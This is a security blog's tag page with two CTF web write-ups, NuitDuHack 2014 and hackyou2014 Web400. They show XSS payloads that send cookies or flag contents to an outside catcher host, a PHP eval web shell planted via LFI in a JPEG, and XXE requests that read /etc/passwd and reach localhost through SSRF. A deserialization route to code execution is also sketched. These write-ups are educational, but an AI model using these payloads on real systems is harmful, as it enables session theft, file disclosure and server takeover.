

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">

    <title>PHP - Page 1 - &lt;/pwntester&gt;</title>
    <meta name="description" content="">

    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <link rel="shortcut icon" href="../../assets/favicon.png?v=d47df0f104">

    <link rel="stylesheet" type="text/css" href="../../assets/css/screen.css?v=d47df0f104">
    <link href="http://fonts.googleapis.com/css?family=Open+Sans:400,700" rel="stylesheet" type="text/css">
    <link href="http://fonts.googleapis.com/css?family=Roboto" rel="stylesheet" type="text/css">

    <script type="text/javascript" src="../../assets/js/jquery-1.11.1.min.js?v=d47df0f104"></script>
    <script type="text/javascript" src="../../assets/js/jquery.fitvids.js?v=d47df0f104"></script>
    <script type="text/javascript" src="../../assets/js/moment.js?v=d47df0f104"></script>
    <script type="text/javascript" src="../../assets/js/handlebars.js?v=d47df0f104"></script>
    <script type="text/javascript" src="../../assets/js/jquery.tapirus.js?v=d47df0f104"></script> 
    <script type="text/javascript" src="../../assets/js/index.js?v=d47df0f104"></script>


    <link rel="canonical" href="http://www.pwntester.com/tag/php/">
    <meta name="referrer" content="no-referrer-when-downgrade">
    
    <meta property="og:site_name" content="&lt;/pwntester&gt;">
    <meta property="og:type" content="website">
    <meta property="og:title" content="PHP - Page 1 - &lt;/pwntester&gt;">
    <meta property="og:url" content="http://www.pwntester.com/tag/php/">
    <meta property="article:modified_time" content="2014-05-04T16:31:52.000Z">
    <meta name="twitter:card" content="summary">
    <meta name="twitter:title" content="PHP - Page 1 - &lt;/pwntester&gt;">
    <meta name="twitter:url" content="http://www.pwntester.com/tag/php/">
    
    <script type="application/ld+json">
{
    "@context": "https://schema.org",
    "@type": "Series",
    "publisher": {
        "@type": "Organization",
        "name": "&lt;/pwntester&gt;",
        "logo": "http://www.pwntester.com/content/images/2014/May/rooted.jpeg"
    },
    "url": "http://www.pwntester.com/tag/php/",
    "name": "PHP",
    "mainEntityOfPage": {
        "@type": "WebPage",
        "@id": "http://www.pwntester.com"
    }
}
    </script>

    <meta name="generator" content="Ghost 0.11">
    <link rel="alternate" type="application/rss+xml" title="&lt;/pwntester&gt;" href="http://www.pwntester.com/rss/">

    <link href="http://netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css" rel="stylesheet">

    <link rel="stylesheet" type="text/css" href="../../assets/css/prism.css?v=d47df0f104">

    <script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-49973078-2', 'pwntester.com');
  ga('send', 'pageview');

</script></head>

<body class="tag-template tag-php">

    <div id="sidebar">
        <div id="sidebar-content" class="inner">
            <a class="blog-logo" href="http://www.pwntester.com"><img src="../../content/images/2014/May/rooted.jpeg" alt="Blog Logo"></a>
            <h2 class="blog-title"><a href="http://www.pwntester.com">&lt;/pwntester&gt;</a>
            <h3 class="blog-description"></h3></h2>

            <!--form id="search">
                <input id="search-field" placeholder="Search"/>
            </form-->
            <form id="search">  
                <input id="search-field" type="search" placeholder="Search">
            </form>  

            <div id="sidebar-links">
                <ul id="subscription-links">
                    <li><a target="_blank" href="http://www.pwntester.com/rss/"><i class="fa fa-rss"></i> Subscribe via RSS</a></li>
                    <!-- No support yet
                    <li><a target="_blank" href=" "><i class="fa fa-envelope"></i> Subscribe via email<a></li>
                    -->
                </ul>
                <ul id="sidebar-internal">
                    <!-- For 'About' and other pages -->
                </ul>
                <ul id="sidebar-external">
                    <li class="external-link"><a href="https://github.com/pwntester"><i class="fa fa-github"></i> GitHub</a></li>
<li class="external-link"><a href="http://www.linkedin.com/in/alvaroms"><i class="fa fa-linkedin"></i> LinkedIn</a></li>
<li class="external-link"><a href="https://twitter.com/pwntester"><i class="fa fa-twitter"></i> Twitter</a></li>
<li class="external-link"><a target="_blank" href="mailto:alvaro@pwntester.com"><i class="fa fa-envelope"></i> Contact</a></li>
                </ul>
            </div>

            <footer class="site-footer">
                <section class="copyright">© 2017 <a href="mailto:alvaro@pwntester.com">Alvaro Muñoz</a> • All rights reserved.</section>
            </footer>
        </div>
    </div>

    <main>
        <section id="results"></section>
        

<header class="tag-archive-header">
    <h4><i class="fa fa-tag"></i><span class="tag-archive-header-name">PHP</span></h4>
</header>


<article class="post tag-ctf tag-xss tag-web tag-php tag-lfi">
    <header class="post-header">
        <span class="post-meta"><time datetime="2014-04-06">06 Apr 2014</time> on <a href="../ctf/">CTF</a>, <a href="../xss/">XSS</a>, <a href="../web/">Web</a>, <a href="index.html">PHP</a>, <a href="../lfi/">LFI</a></span>
        <h2 class="post-title"><a href="../../blog/2014/04/06/nuitduhack-2014-web-write-ups/">NuitDuHack 2014 Web Write Ups</a></h2>

    </header>
    <section class="post-content">
        <h1 id="web100abitol">Web 100: Abitol</h1>

<p>This is a simple web app where you can register and login to see an articles page, a photo gallery, a flag page and an admin contact page.</p>

<p>Visiting the flag page give us a <code>Nice try, did you really think it would be that easy? ;)</code> but the photo gallery is vulnerable to XSS:</p>

<p><code>http://abitbol.nuitduhack.com/zoom.php?image=1%3E%3Cscript%3Ealert%281%29%3C/script%3E</code></p>

<p><img src="../../content/images/octopress/ndh_1.png" alt=""></p>

<p>Now, we dont know how the admin contact will be visualized in the viewer page, but we can try to send him a message with an iframe pointing to the vulnerable page so we can send his session ID to our cookie catcher or use XHR to request the flag.php page and send us the flag. Both options work, but the second is slighlty better since the time frame where the session ID is valid is very narrow:</p>

<pre><code class="language-lang-bash line-numbers ">&lt;iframe src="http://abitbol.nuitduhack.com/zoom.php?image=1.jpg&gt;&lt;script&gt;flag = new XMLHttpRequest(); flag.open('GET','/flag.php',false); flag.send(); flag.open('GET','http://ctf.pwntester.com/catcher.php?data='+flag.response); flag.send();&lt;/script&gt;" /&gt;  
</code></pre>

<pre><code class="language-lang-bash line-numbers ">&lt;iframe src="http://abitbol.nuitduhack.com/zoom.php?image=1.jpg&gt;&lt;script&gt;document.location="http://ctf.pwntest.com/catcher.php?data="+document.cookie&lt;/script&gt;" /&gt;  
</code></pre>

<p>After waiting a few minutes, the flag is waiting for us in the catcher:</p>

<p><img src="../../content/images/octopress/ndh_2.png" alt=""></p>

<h1 id="web300titanoreine">Web 300: Titanoreine</h1>

<p>This is a photo gallery where we can upload any image to the site. That seems the first attack vector, the second one is that it allows you to change the language and the parameter to do that is <code>lang=(eng|fr).php</code> which looks vulnerable to LFI. After some trials, you can include any local file in the root directory by going down three levels. Eg:  <code>../../../upload.php</code></p>

<p><img src="../../content/images/octopress/ndh_3.png" alt=""></p>

<p>If we include the default images in the gallery system, we can see that only <code>2.jpg</code> is included as binary garbage in the page:</p>

<p><img src="../../content/images/octopress/ndh_4.png" alt=""></p>

<p>However if we download the original image and upload it again with a different name, the new image cannot be included and the LFI just show an empty page. So there seems to be some kind of conversion going on. Comparing the EXIF data of the original and converted ones, we can see that is being compressed by gd library with quality 98:</p>

<p><img src="../../content/images/octopress/ndh_5.png" alt=""></p>

<p>We will compress it locally so that it does not suffer any conversion in the server (actually the server still changes the image, but probability of screwing up the php code are smaller):</p>

<pre><code class="language-lang-php line-numbers ">$image = imagecreatefromjpeg('avatar.jpg');
imagejpeg($image,'avatar_lq.jpg',98);  
</code></pre>

<p>Uploading the new compressed image to the site and including it via the LFI works now. All we have to do now is include a PHP shell. It turns out that many PHP commands seems to be forbidden by the server so we ended up using eval: <code>&lt;?php eval($_GET['a']); ?&gt;</code></p>

<p>Update: During the CTF, we were lucky to find another team JPG so that we could slightly modufy it and use it. Modifying a JPG so that the changes survide a GD compression is not an easy task, but will try to explain in a following post.</p>

<p>With that in place we can start sending commands to the server. First we can exfiltrate the code using <code>highlight_file()</code>:</p>

<p><code>index.php</code>
<img src="../../content/images/octopress/ndh_7.png" alt=""></p>

<p><code>functions.php</code>
<img src="../../content/images/octopress/ndh_8.png" alt=""></p>

<p><code>upload.php</code>
<img src="../../content/images/octopress/ndh_9.png" alt=""></p>

<p>In order to get the flag, I used a directoryIterator since many other options were cut off:</p>

<pre><code class="language-lang-php line-numbers ">$it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator('./'));while($it-&gt;valid()){echo $it-&gt;getSubPathName()."&lt;/br&gt;";$it-&gt;next();}
</code></pre>

<p><img src="../../content/images/octopress/ndh_10.png" alt=""></p>

<p>The flag is hidden in the unsuspicious file:</p>

<p><img src="../../content/images/octopress/ndh_11.png" alt=""></p>

<p>Voila!</p>

<p>Thanks to <strong>in3pids</strong>, <strong>@<em>SaxX</em></strong> and the organization for such a fun CTF!</p>
    </section>
</article>


<article class="post tag-xxe tag-rce39 tag-ctf tag-php tag-hackyou201458 tag-ssrf">
    <header class="post-header">
        <span class="post-meta"><time datetime="2014-01-17">17 Jan 2014</time> on <a href="../xxe/">XXE</a>, <a href="../rce39/">RCE</a>, <a href="../ctf/">CTF</a>, <a href="index.html">PHP</a>, <a href="../hackyou201458/">HackYou2014</a>, <a href="../ssrf/">SSRF</a></span>
        <h2 class="post-title"><a href="../../blog/2014/01/17/hackyou2014-web400-write-up/">#hackyou2014 Web400 write-up</a></h2>

    </header>
    <section class="post-content">
        <p>I did not solve this <a href="http://hackyou2014tasks.ctf.su:40080/">level</a> during the CTF, but found it so interesting reading <a href="https://twitter.com/Xelenonz">Xelenonz</a> <a href="http://blog.rop.sh/hackyou2014-phpwning-web400/">write-up</a> that I couldnt help trying it myself just for the fun and since this blog is my personal notes, I decided to write it here for future reference, but all credits go to <a href="https://twitter.com/Xelenonz">Xelenonz</a>.</p>

<p>We are given the <a href="http://hackyou.ctf.su/files/web400.zip">code</a> of a Image hostig web app. Reading the code we see how it handle the requests:</p>

<pre><code class="language-lang-php line-numbers data-line=6 ">include 'config.php';  
include 'classes.php';  
$action = (isset($_REQUEST['action'])) ? $_REQUEST['action'] : 'View';
$param = (isset($_REQUEST['param'])) ? $_REQUEST['param'] : 'index';
$page = new $action($param);
echo $page;  
</code></pre>

<p>So <strong>action</strong> is used to instantiate any arbitrary class and <strong>param</strong> is the argument for the constructor. Cool. We are given a bunch of classes the application uses to upload and view images and to manage the Session object:</p>

<pre><code class="language-lang-php line-numbers ">class View {  
    function __construct($page) {
        ob_start();
        readfile('html/header.html');
        switch ($page) {
            case 'index':
                readfile('html/index.tpl.html');
                break;
            case 'upload':
                readfile('html/upload.tpl.html');
                break;
        }
        readfile('html/footer.html');
    }
    function __toString() {
        $this-&gt;content = ob_get_contents();
        ob_end_clean();
        return $this-&gt;content;
    }
}

class Upload {  
    function __construct($data) {
        global $config;
        $this-&gt;data = base64_decode($data);
        $this-&gt;filename = md5(uniqid(rand(), true));
        $this-&gt;path = $config['root'].'images/'.$this-&gt;filename;
        file_put_contents($this-&gt;path, $this-&gt;data);
        $this-&gt;type = exif_imagetype($this-&gt;path);
    }
    function __toString() {
        if ($this-&gt;type) {
            $link = 'http://'.$_SERVER['SERVER_NAME'].'/'.$this-&gt;filename;
            return '&lt;p&gt;Successfully updated!&lt;/p&gt;Your link: &lt;a href="'.$link.'"&gt;'.$link.'&lt;/a&gt;';
        } else {
            return '&lt;p&gt;Wrong file type!&lt;p&gt;';
        }
    }
    function __destruct() {
        if ($this-&gt;type) {
            echo '&lt;p&gt;Some file info:

{gfm-js-extract-pre-1}&lt;/p&gt;';
        } else {
            unlink($this-&gt;path);
        }
    }
}

class Image {  
    function __construct($filename) {
        global $config;
        $this-&gt;filename = $filename;
        $this-&gt;path = $config['root'].'images/'.$this-&gt;filename;
    }
    function __toString() {
        if (preg_match('/^[a-f0-9]{32}$/', $this-&gt;filename) &amp;&amp; file_exists($this-&gt;path)) {
            $this-&gt;type = exif_imagetype($this-&gt;path);
            $this-&gt;mime = image_type_to_mime_type($this-&gt;type);
            header('Content-Type: '.$this-&gt;mime);
            return file_get_contents($this-&gt;path);
        } else {
            return '&lt;h1&gt;Error&lt;/h1&gt;';
        }
    }
}

class Session {  
    function __construct() {
        global $config;
        session_set_save_handler(
            array($this, "open"), array($this, "close"),  array($this, "read"),
            array($this, "write"),array($this, "destroy"),array($this, "gc")
        );
        $this-&gt;key = $config['key'];
        $this-&gt;size = 32;
        $this-&gt;path = '/tmp';
    }

    function encrypt($data) {
        $iv = mcrypt_create_iv($this-&gt;size, MCRYPT_RAND);
        $key = hash('sha256', $this-&gt;key, true);
        $data = $iv.mcrypt_encrypt(MCRYPT_RIJNDAEL_256, $key, $data, MCRYPT_MODE_CBC, $iv);
        return $data;
    }

    function decrypt($data) {
        $key = hash('sha256', $this-&gt;key, true);
        $iv = substr($data, 0, $this-&gt;size);
        $data = substr($data, $this-&gt;size);
        $data = mcrypt_decrypt(MCRYPT_RIJNDAEL_256, $key, $data, MCRYPT_MODE_CBC, $iv);
        return $data;
    }

    function write($id, $data) {
        $path = $this-&gt;path.'/'.$id;
        $data = $this-&gt;encrypt($data);
        file_put_contents($path, $data);
    }

    function read($id) {
        $path = $this-&gt;path.'/'.$id;
        $data = null;
        if (is_file($path)) {
            $data = file_get_contents($path);
            $data = $this-&gt;decrypt($data);
        }
        return $data;
    }

    function open($sess_path, $sess_id) {
        //nothing
    }

    function close() {
        return true;
    }

    function gc($maxlifetime) {
        $path = $this-&gt;path.'/*';
        foreach (glob($path) as $file) {
            if (filemtime($file) + $maxlifetime &lt; time() &amp;&amp; file_exists($file)) {
                unlink($file);
            }
        }
        return true;
    }

    function destroy($id) {
        $path = $this-&gt;path.'/'.$id;
        if (is_file($path)) {
            unlink($path);
        }
        return true;
    }
}
</code></pre>

<p>The most interesting one are the <strong>Upload</strong> class whose destructor runs "arbitrary code" and <strong>Session</strong> which tell us how the Session object is initializated and stored/read from disk (although, we dont know the encryption key that is stored in the config.php file). These are classes are interesting but not useful if we can only create an instance and print the instance tostring return value. Lets look for PHP system classes that could be more useful:</p>

<pre><code class="language-lang-bash line-numbers ">alvaro@winterfell ~&gt; php -r 'var_dump (get_declared_classes ());'  
array(139) {  
  [0]=&gt; string(8) "stdClass"
  [1]=&gt; string(9) "Exception"
  [2]=&gt; string(14) "ErrorException"
  [3]=&gt; string(7) "Closure"
  [4]=&gt; string(8) "DateTime"
  [5]=&gt; string(12) "DateTimeZone"
  [6]=&gt; string(12) "DateInterval"
  [7]=&gt; string(10) "DatePeriod"
  [8]=&gt; string(11) "LibXMLError"
  [9]=&gt; string(7) "SQLite3"
  [10]=&gt; string(11) "SQLite3Stmt"
  [11]=&gt; string(13) "SQLite3Result"
  [12]=&gt; string(12) "DOMException"
  [13]=&gt; string(13) "DOMStringList"
  [14]=&gt; string(11) "DOMNameList"
  [15]=&gt; string(21) "DOMImplementationList"
  [16]=&gt; string(23) "DOMImplementationSource"
  [17]=&gt; string(17) "DOMImplementation"
  [18]=&gt; string(7) "DOMNode"
  [19]=&gt; string(16) "DOMNameSpaceNode"
  [20]=&gt; string(19) "DOMDocumentFragment"
  [21]=&gt; string(11) "DOMDocument"
  [22]=&gt; string(11) "DOMNodeList"
  [23]=&gt; string(15) "DOMNamedNodeMap"
  [24]=&gt; string(16) "DOMCharacterData"
  [25]=&gt; string(7) "DOMAttr"
  [26]=&gt; string(10) "DOMElement"
  [27]=&gt; string(7) "DOMText"
  [28]=&gt; string(10) "DOMComment"
  [29]=&gt; string(11) "DOMTypeinfo"
  [30]=&gt; string(18) "DOMUserDataHandler"
  [31]=&gt; string(11) "DOMDomError"
  [32]=&gt; string(15) "DOMErrorHandler"
  [33]=&gt; string(10) "DOMLocator"
  [34]=&gt; string(16) "DOMConfiguration"
  [35]=&gt; string(15) "DOMCdataSection"
  [36]=&gt; string(15) "DOMDocumentType"
  [37]=&gt; string(11) "DOMNotation"
  [38]=&gt; string(9) "DOMEntity"
  [39]=&gt; string(18) "DOMEntityReference"
  [40]=&gt; string(24) "DOMProcessingInstruction"
  [41]=&gt; string(15) "DOMStringExtend"
  [42]=&gt; string(8) "DOMXPath"
  [43]=&gt; string(5) "finfo"
  [44]=&gt; string(14) "LogicException"
  [45]=&gt; string(24) "BadFunctionCallException"
  [46]=&gt; string(22) "BadMethodCallException"
  [47]=&gt; string(15) "DomainException"
  [48]=&gt; string(24) "InvalidArgumentException"
  [49]=&gt; string(15) "LengthException"
  [50]=&gt; string(19) "OutOfRangeException"
  [51]=&gt; string(16) "RuntimeException"
  [52]=&gt; string(20) "OutOfBoundsException"
  [53]=&gt; string(17) "OverflowException"
  [54]=&gt; string(14) "RangeException"
  [55]=&gt; string(18) "UnderflowException"
  [56]=&gt; string(24) "UnexpectedValueException"
  [57]=&gt; string(25) "RecursiveIteratorIterator"
  [58]=&gt; string(16) "IteratorIterator"
  [59]=&gt; string(14) "FilterIterator"
  [60]=&gt; string(23) "RecursiveFilterIterator"
  [61]=&gt; string(22) "CallbackFilterIterator"
  [62]=&gt; string(31) "RecursiveCallbackFilterIterator"
  [63]=&gt; string(14) "ParentIterator"
  [64]=&gt; string(13) "LimitIterator"
  [65]=&gt; string(15) "CachingIterator"
  [66]=&gt; string(24) "RecursiveCachingIterator"
  [67]=&gt; string(16) "NoRewindIterator"
  [68]=&gt; string(14) "AppendIterator"
  [69]=&gt; string(16) "InfiniteIterator"
  [70]=&gt; string(13) "RegexIterator"
  [71]=&gt; string(22) "RecursiveRegexIterator"
  [72]=&gt; string(13) "EmptyIterator"
  [73]=&gt; string(21) "RecursiveTreeIterator"
  [74]=&gt; string(11) "ArrayObject"
  [75]=&gt; string(13) "ArrayIterator"
  [76]=&gt; string(22) "RecursiveArrayIterator"
  [77]=&gt; string(11) "SplFileInfo"
  [78]=&gt; string(17) "DirectoryIterator"
  [79]=&gt; string(18) "FilesystemIterator"
  [80]=&gt; string(26) "RecursiveDirectoryIterator"
  [81]=&gt; string(12) "GlobIterator"
  [82]=&gt; string(13) "SplFileObject"
  [83]=&gt; string(17) "SplTempFileObject"
  [84]=&gt; string(19) "SplDoublyLinkedList"
  [85]=&gt; string(8) "SplQueue"
  [86]=&gt; string(8) "SplStack"
  [87]=&gt; string(7) "SplHeap"
  [88]=&gt; string(10) "SplMinHeap"
  [89]=&gt; string(10) "SplMaxHeap"
  [90]=&gt; string(16) "SplPriorityQueue"
  [91]=&gt; string(13) "SplFixedArray"
  [92]=&gt; string(16) "SplObjectStorage"
  [93]=&gt; string(16) "MultipleIterator"
  [94]=&gt; string(14) "SessionHandler"
  [95]=&gt; string(22) "__PHP_Incomplete_Class"
  [96]=&gt; string(15) "php_user_filter"
  [97]=&gt; string(9) "Directory"
  [98]=&gt; string(20) "mysqli_sql_exception"
  [99]=&gt; string(13) "mysqli_driver"
  [100]=&gt; string(6) "mysqli"
  [101]=&gt; string(14) "mysqli_warning"
  [102]=&gt; string(13) "mysqli_result"
  [103]=&gt; string(11) "mysqli_stmt"
  [104]=&gt; string(12) "PDOException"
  [105]=&gt; string(3) "PDO"
  [106]=&gt; string(12) "PDOStatement"
  [107]=&gt; string(6) "PDORow"
  [108]=&gt; string(13) "PharException"
  [109]=&gt; string(4) "Phar"
  [110]=&gt; string(8) "PharData"
  [111]=&gt; string(12) "PharFileInfo"
  [112]=&gt; string(19) "ReflectionException"
  [113]=&gt; string(10) "Reflection"
  [114]=&gt; string(26) "ReflectionFunctionAbstract"
  [115]=&gt; string(18) "ReflectionFunction"
  [116]=&gt; string(19) "ReflectionParameter"
  [117]=&gt; string(16) "ReflectionMethod"
  [118]=&gt; string(15) "ReflectionClass"
  [119]=&gt; string(16) "ReflectionObject"
  [120]=&gt; string(18) "ReflectionProperty"
  [121]=&gt; string(19) "ReflectionExtension"
  [122]=&gt; string(23) "ReflectionZendExtension"
  [123]=&gt; string(16) "SimpleXMLElement"
  [124]=&gt; string(17) "SimpleXMLIterator"
  [125]=&gt; string(4) "SNMP"
  [126]=&gt; string(13) "SNMPException"
  [127]=&gt; string(10) "SoapClient"
  [128]=&gt; string(7) "SoapVar"
  [129]=&gt; string(10) "SoapServer"
  [130]=&gt; string(9) "SoapFault"
  [131]=&gt; string(9) "SoapParam"
  [132]=&gt; string(10) "SoapHeader"
  [133]=&gt; string(4) "tidy"
  [134]=&gt; string(8) "tidyNode"
  [135]=&gt; string(9) "XMLReader"
  [136]=&gt; string(9) "XMLWriter"
  [137]=&gt; string(13) "XSLTProcessor"
  [138]=&gt; string(10) "ZipArchive"
}
</code></pre>

<p>That's a bunch of classes but going through them we find two that are particulary interest: "SplFileObject" and "SimpleXmlElement". <br>
With SplFileObject we are returned the first line of any file:</p>

<p><img src="../../content/images/octopress/web400-0.png" alt=""></p>

<p>You can however, use PHP filters to encode it base64 and get all file contents as a long base64 line:</p>

<p><img src="../../content/images/octopress/web400-1.png" alt=""></p>

<p>Thats pretty cool, now we can decode it and get the key:</p>

<pre><code class="language-lang-php line-numbers ">$config = array();
$config['root'] = '/var/www/';
$config['key'] = '6hQJMFh8gRje67EmpDX3';
$config['IP'] = array('127.0.0.1');
$config['password'] = '3fd5b6db6bc90ddd6a6f6caad27d8b00';
</code></pre>

<p>And thats basically as far as I got, I could not bypass the restriction in the "admin.php" to allow only requests from localhost so I could not start the session and try to take advantage of it.</p>

<p>After the CTF ended I found out that we could submit XML documents with external entities and launch a SSRF attack from there. Lets see how. <br>
We can use the "SimpleXMLElement" class to create XML documents like:</p>

<pre><code class="language-lang-bash line-numbers ">POST /index.php?action=SimpleXMLElement HTTP/1.1  
Host: hackyou2014tasks.ctf.su:40080  
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:26.0) Gecko/20100101 Firefox/26.0  
Content-Type: application/x-www-form-urlencoded;application/xml  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8  
Accept-Language: en-us,es-es;q=0.8,es;q=0.5,en;q=0.3  
Accept-Encoding: gzip, deflate  
Connection: keep-alive  
Content-Length: 21

param=&lt;foo&gt;test&lt;/foo&gt;  
</code></pre>

<p><img src="../../content/images/octopress/web400-2.png" alt=""></p>

<p>Actually I tried this during the CTF but forgot to add the "Content-Type" header so kept on getting "Internal Server Errors", damn!</p>

<p>Anyway, The server returns us our XML document so now we can try to inject external entities:</p>

<pre><code class="language-lang-bash line-numbers ">POST /index.php?action=SimpleXMLElement HTTP/1.1  
Host: hackyou2014tasks.ctf.su:40080  
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:26.0) Gecko/20100101 Firefox/26.0  
Content-Type: application/x-www-form-urlencoded;application/xml  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8  
Accept-Language: en-us,es-es;q=0.8,es;q=0.5,en;q=0.3  
Accept-Encoding: gzip, deflate  
Connection: keep-alive  
Content-Length: 76

param=&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "/etc/passwd" &gt;]&gt;&lt;foo&gt;%26xxe;&lt;/foo&gt;  
</code></pre>

<pre><code class="language-lang-bash line-numbers ">HTTP/1.1 200 OK  
Date: Fri, 17 Jan 2014 13:49:12 GMT  
Server: Apache/2.2.22 (Ubuntu)  
X-Powered-By: PHP/5.3.10-1ubuntu3.8  
Vary: Accept-Encoding  
Content-Length: 1041  
Keep-Alive: timeout=5, max=100  
Connection: Keep-Alive  
Content-Type: text/html

root:x:0:0:root:/root:/bin/bash  
daemon:x:1:1:daemon:/usr/sbin:/bin/sh  
bin:x:2:2:bin:/bin:/bin/sh  
sys:x:3:3:sys:/dev:/bin/sh  
sync:x:4:65534:sync:/bin:/bin/sync  
games:x:5:60:games:/usr/games:/bin/sh  
man:x:6:12:man:/var/cache/man:/bin/sh  
lp:x:7:7:lp:/var/spool/lpd:/bin/sh  
mail:x:8:8:mail:/var/mail:/bin/sh  
news:x:9:9:news:/var/spool/news:/bin/sh  
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh  
proxy:x:13:13:proxy:/bin:/bin/sh  
www-data:x:33:33:www-data:/var/www:/bin/sh  
backup:x:34:34:backup:/var/backups:/bin/sh  
list:x:38:38:Mailing List Manager:/var/list:/bin/sh  
irc:x:39:39:ircd:/var/run/ircd:/bin/sh  
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh  
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh  
libuuid:x:100:101::/var/lib/libuuid:/bin/sh  
syslog:x:101:103::/home/syslog:/bin/false  
messagebus:x:102:105::/var/run/dbus:/bin/false  
whoopsie:x:103:106::/nonexistent:/bin/false  
landscape:x:104:109::/var/lib/landscape:/bin/false  
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin  
user:x:1000:1000:user,,,:/home/user:/bin/bash  
</code></pre>

<p>The nice thing about this XXE vulnerability is not that we can read any file (that we already could using the SplFileObject class) but that we can use to initiate requests from the own server!</p>

<p>Now we can bypass localhost address restriction, however accessing <a href="http://locahost/admin.php">http://locahost/admin.php</a> returns some characters that break the XML schema so we will use the PHP base64 encoder filter to return an XML schema friendly version of the page:</p>

<pre><code class="language-lang-bash line-numbers ">POST /index.php?action=SimpleXMLElement HTTP/1.1  
Host: hackyou2014tasks.ctf.su:40080  
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:26.0) Gecko/20100101 Firefox/26.0  
Content-Type: application/x-www-form-urlencoded;application/xml  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8  
Accept-Language: en-us,es-es;q=0.8,es;q=0.5,en;q=0.3  
Accept-Encoding: gzip, deflate  
Connection: keep-alive  
Content-Length: 140

param=&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=http://localhost/admin.php" &gt;]&gt;&lt;foo&gt;%26xxe;&lt;/foo&gt;  
</code></pre>

<pre><code class="language-lang-bash line-numbers ">HTTP/1.1 200 OK  
Date: Fri, 17 Jan 2014 13:51:57 GMT  
Server: Apache/2.2.22 (Ubuntu)  
X-Powered-By: PHP/5.3.10-1ubuntu3.8  
Vary: Accept-Encoding  
Content-Length: 256  
Keep-Alive: timeout=5, max=100  
Connection: Keep-Alive  
Content-Type: text/html

PGh0bWw+Cjxib2R5PgoJPGI+RW50ZXIgcGFzc3dvcmQ6PC9iPgoJPGZvcm0gYWN0aW9uPSJhZG1pbi5waHAiIG1ldGhvZD0iUE9TVCI+CgkJPGlucHV0IHR5cGU9InRleHQiIG5hbWU9InBhc3N3b3JkIj4KCQk8aW5wdXQgdHlwZT0ic3VibWl0IiBuYW1lPSJzdWJtaXQiIHZhbHVlPSJHTyI+Cgk8L2Zvcm0+CjwvYm9keT4KPC9odG1sPgo=  
</code></pre>

<p>That decodes into:</p>

<pre><code class="language-lang-html line-numbers ">&lt;html&gt;  
&lt;body&gt;  
    &lt;b&gt;Enter password:&lt;/b&gt;
    &lt;form action="admin.php" method="POST"&gt;
        &lt;input type="text" name="password"&gt;
        &lt;input type="submit" name="submit" value="GO"&gt;
    &lt;/form&gt;
&lt;/body&gt;  
&lt;/html&gt;  
</code></pre>

<p>Now, I dont really need to become admin since right after the local IP check, the Session is initialized:</p>

<pre><code class="language-lang-php line-numbers ">if (!in_array($_SERVER['REMOTE_ADDR'], $config['IP']))  
    die('&lt;h1&gt;Access denied&lt;/h1&gt;');

$handler = new Session();
session_start();  
</code></pre>

<p>So <strong>session_start()</strong> will call the session handler <strong>open()</strong> and <strong>read()</strong> methods to restore the session. If we look at our custom Session handler we see that the serialized session is read from /tmp/&lt;phpsessionid&gt;:</p>

<pre><code class="language-lang-php line-numbers data-line=9,16-17 ">function __construct() {  
    global $config;
    session_set_save_handler(
        array($this, "open"), array($this, "close"),  array($this, "read"),
        array($this, "write"),array($this, "destroy"),array($this, "gc")
    );
    $this-&gt;key = $config['key'];
    $this-&gt;size = 32;
    $this-&gt;path = '/tmp';
}

function read($id) {  
    $path = $this-&gt;path.'/'.$id;
    $data = null;
    if (is_file($path)) {
        $data = file_get_contents($path);
        $data = $this-&gt;decrypt($data);
    }
    return $data;
}
</code></pre>

<p>And since we can control PHPSESSIONID by sending it as a query parameter using the SSRF attack, we can point the <strong>read()</strong> method to a different file. Luckly for us we can upload images to /var/www/images right?? so if we make:</p>

<pre><code class="language-lang-bash line-numbers ">PHPSESSIONID=../var/www/images/&lt;image under control&gt;  
</code></pre>

<p>We will fool the application to read the session from our file. All we have to do now is uploading an image that is an encrypted version of a serialized session containing any arbitrary objects we want to store there.</p>

<p>Here its where the <strong>Upload</strong> class come really handy since its destructor can execute any command if we control the $this-path variable which we do:</p>

<pre><code class="language-lang-php line-numbers ">class Upload {  
    function __construct($data) {
        global $config;
        $this-&gt;data = base64_decode($data);
        $this-&gt;filename = md5(uniqid(rand(), true));
        $this-&gt;path = $config['root'].'images/'.$this-&gt;filename;
        file_put_contents($this-&gt;path, $this-&gt;data);
        $this-&gt;type = exif_imagetype($this-&gt;path);
    }
    function __toString() {
        if ($this-&gt;type) {
            $link = 'http://'.$_SERVER['SERVER_NAME'].'/'.$this-&gt;filename;
            return '&lt;p&gt;Successfully updated!&lt;/p&gt;Your link: &lt;a href="'.$link.'"&gt;'.$link.'&lt;/a&gt;';
        } else {
            return '&lt;p&gt;Wrong file type!&lt;p&gt;';
        }
    }
    function __destruct() {
        if ($this-&gt;type) {
            echo '&lt;p&gt;Some file info:

{gfm-js-extract-pre-2}&lt;/p&gt;';
        } else {
            unlink($this-&gt;path);
        }
    }
}
</code></pre>

<p>So we can craft a session object containing an instance of a hand crafted <strong>Upolad*</strong> class and assign it to $_SESSION['auth'] (so the welcome message is printed).</p>

